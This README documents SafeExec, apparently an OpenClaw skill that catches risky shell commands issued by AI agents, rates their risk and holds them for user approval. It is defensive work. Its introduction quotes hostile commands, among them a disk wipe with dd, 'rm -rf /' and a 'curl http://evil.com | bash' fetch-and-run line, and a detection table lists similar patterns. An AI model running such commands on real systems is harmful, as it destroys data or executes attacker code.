# SafeExec - AI Agent 安全防护层

> 🛡️ 为 AI Agent 添加最后一道防线 - 拦截危险命令，保护你的系统

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![OpenClaw](https://img.shields.io/badge/OpenClaw-Skill-blue)](https://openclaw.ai)
[![Security](https://img.shields.io/badge/Security-Critical-red)]()

---

## ✨ 为什么需要 SafeExec？

AI Agents 是强大的助手，但也可能造成严重损害：

- 💥 **误删数据** - 一句"清理临时文件"可能变成 `rm -rf /`
- 🔥 **系统破坏** - "优化磁盘"可能执行 `dd if=/dev/zero of=/dev/sda`
- 🚪 **安全漏洞** - "安装这个工具"可能运行 `curl http://evil.com | bash`

**SafeExec 就是为解决这个问题而生。**

---

## 🎯 核心功能

### 1️⃣ 智能风险评估

自动检测 10+ 类危险操作：

| 风险等级 | 检测模式 | 说明 |
|---------|---------|------|
| 🔴 **CRITICAL** | `rm -rf /` | 删除系统文件 |
| 🔴 **CRITICAL** | `dd if=` | 磁盘破坏 |
| 🔴 **CRITICAL** | `mkfs.*` | 格式化文件系统 |
| 🔴 **CRITICAL** | Fork bomb | 系统 DoS |
| 🟠 **HIGH** | `chmod 777` | 权限提升 |
| 🟠 **HIGH** | `curl | bash` | 代码注入 |
| 🟠 **HIGH** | 写入 `/etc/` | 系统配置篡改 |
| 🟡 **MEDIUM** | `sudo` | 特权操作 |
| 🟡 **MEDIUM** | 防火墙修改 | 网络暴露 |

### 2️⃣ 命令拦截与审批

```
用户请求 → AI Agent → safe-exec 执行
                         ↓
                    风险评估
                    /      \
               安全      危险
                |          |
              执行      拦截 + 通知
                         ↓
                    等待用户批准
                         ↓
              [批准] → 执行 / [拒绝] → 取消
```

### 3️⃣ 完整审计追踪

所有操作都被记录到 `~/.openclaw/safe-exec-audit.log`：

```json
{
  "timestamp": "2026-01-31T16:44:17.217Z",
  "event": "approval_requested",
  "requestId": "req_1769877857_2352",
  "command": "rm -rf /tmp/test\n",
  "risk": "critical",
  "reason": "删除根目录或家目录文件"
}
```

---

## 📦 安装

### OpenClaw Skill 安装（推荐）

```bash
# 1. 克隆仓库
git clone https://github.com/yourusername/safe-exec.git ~/.openclaw/skills/safe-exec

# 2. 添加执行权限
chmod +x ~/.openclaw/skills/safe-exec/*.sh

# 3. 创建全局命令链接
ln -sf ~/.openclaw/skills/safe-exec/safe-exec.sh ~/.local/bin/safe-exec
ln -sf ~/.openclaw/skills/safe-exec/safe-exec-approve.sh ~/.local/bin/safe-exec-approve
ln -sf ~/.openclaw/skills/safe-exec/safe-exec-reject.sh ~/.local/bin/safe-exec-reject
ln -sf ~/.openclaw/skills/safe-exec/safe-exec-list.sh ~/.local/bin/safe-exec-list

# 4. 测试安装
safe-exec "echo 'Hello SafeExec!'"
```

### 手动安装

```bash
# 下载脚本到 PATH
curl -o ~/.local/bin/safe-exec https://raw.githubusercontent.com/yourusername/safe-exec/main/safe-exec.sh
chmod +x ~/.local/bin/safe-exec
```

---

## 🚀 使用方法

### 基础使用

```bash
# 执行命令（安全命令直接执行）
safe-exec "ls -la"

# 危险命令会被拦截
safe-exec "rm -rf /tmp/test"

# 查看待处理的请求
safe-exec --list

# 批准请求
safe-exec-approve req_xxxxx

# 拒绝请求
safe-exec-reject req_xxxxx
```

### 在 OpenClaw Agent 中使用

**在 Feishu/Telegram/WhatsApp 中直接告诉 Agent：**

```
请使用 safe-exec 执行：rm -rf /tmp/data
```

**Agent 会自动：**
1. 调用 safe-exec 执行命令
2. 检测到危险操作
3. 发送风险提示给你
4. 等待你批准后再执行

### 示例对话

```
你: 请使用 safe-exec 执行：rm -rf /home/user/old-project

🤖 Agent:
🚨 **危险操作检测 - 命令已拦截**

**风险等级:** CRITICAL
**命令:** `rm -rf /home/user/old-project`
**原因:** 删除根目录或家目录文件

**请求 ID:** `req_1769878138_4245`

ℹ️  此命令需要用户批准才能执行。

批准方法: safe-exec-approve req_1769878138_4245
拒绝方法: safe-exec-reject req_1769878138_4245
```

---

## ⚙️ 配置

### 自定义规则

编辑 `~/.openclaw/safe-exec-rules.json`：

```json
{
  "rules": [
    {
      "pattern": "YOUR_REGEX_PATTERN",
      "risk": "high",
      "description": "你的自定义规则描述"
    }
  ]
}
```

### 环境变量

```bash
# 审计日志路径
export SAFE_EXEC_AUDIT_LOG="$HOME/.openclaw/safe-exec-audit.log"

# 请求超时时间（秒）
export SAFE_EXEC_TIMEOUT=300

# Feishu 群组 ID（用于通知）
export SAFE_EXEC_FEISHU_GROUP="oc_xxxxx"
```

---

## 📊 工作原理

```
┌─────────────────────────────────────────────┐
│         用户 / AI Agent                      │
└──────────────────┬──────────────────────────┘
                   │
                   ▼
         ┌─────────────────┐
         │   safe-exec     │
         │   (入口点)       │
         └────────┬─────────┘
                  │
                  ▼
         ┌─────────────────┐
         │   风险评估引擎   │
         │                 │
         │ • 模式匹配      │
         │ • 风险分级      │
         │ • 规则引擎      │
         └────────┬─────────┘
                  │
        ┌─────────┴─────────┐
        │                   │
   [安全]              [危险]
        │                   │
        ▼                   ▼
   直接执行          拦截 + 通知
        │                   │
        │              ┌─────┴─────┐
        │              │           │
        │           等待批准      审计日志
        │              │
        │         ┌────┴────┐
        │         │         │
        │      [批准]    [拒绝]
        │         │         │
        │         ▼         ▼
        │      执行      取消
        │         │
        └─────────┴─────────┘
                  │
                  ▼
           ┌─────────────┐
           │   审计日志   │
           └─────────────┘
```

---

## 🔒 安全特性

- ✅ **零信任** - 所有命令默认需要审批
- ✅ **完整审计** - 记录所有安全事件
- ✅ **不可变日志** - 审计日志采用追加模式
- ✅ **最小权限** - 不需要额外的系统权限
- ✅ **透明性** - 用户始终知道正在执行什么
- ✅ **可配置** - 灵活的规则系统

---

## 🧪 测试

```bash
# 运行测试套件
bash ~/.openclaw/skills/safe-exec/test.sh

# 手动测试
safe-exec "echo '安全命令测试'"
safe-exec "rm -rf /tmp/test-dangerous"
```

---

## 📈 路线图

### v0.2.0 (进行中)
- [ ] 支持更多通知渠道（Telegram, Discord）
- [ ] Web UI 审批界面
- [ ] 更智能的风险评估（机器学习）
- [ ] 批量操作支持

### v0.3.0 (计划中)
- [ ] 多用户支持
- [ ] RBAC 权限控制
- [ ] 审计日志加密
- [ ] SIEM 集成

### v1.0.0 (未来)
- [ ] 企业级功能
- [ ] SaaS 部署支持
- [ ] 完整的 API

---

## 🤝 贡献

欢迎贡献！请查看 [CONTRIBUTING.md](CONTRIBUTING.md) 了解详情。

```bash
# Fork 仓库
git clone https://github.com/yourusername/safe-exec.git

# 创建功能分支
git checkout -b feature/amazing-feature

# 提交更改
git commit -m "Add amazing feature"

# 推送到分支
git push origin feature/amazing-feature

# 开启 Pull Request
```

---

## 📝 许可证

MIT License - 详见 [LICENSE](LICENSE) 文件

---

## 🙏 致谢

- [OpenClaw](https://openclaw.ai) - 强大的 AI Agent 框架
- [Sudo](https://www.sudo.ws/) - 启发了审批机制的设计
- 所有贡献者和用户

---

## 📮 联系方式

- **GitHub Issues**: [提交问题](https://github.com/yourusername/safe-exec/issues)
- **Email**: your.email@example.com
- **Discord**: [OpenClaw Community](https://discord.gg/clawd)

---

## 🌟 Star History

如果这个项目对你有帮助，请给个 Star ⭐

[![Star History Chart](https://api.star-history.com/svg?repos=yourusername/safe-exec&type=Date)](https://star-history.com/#yourusername/safe-exec&Date)

---

**Made with ❤️ by the OpenClaw community**

> "AI 是强大的助手，但安全永远是第一优先级。"
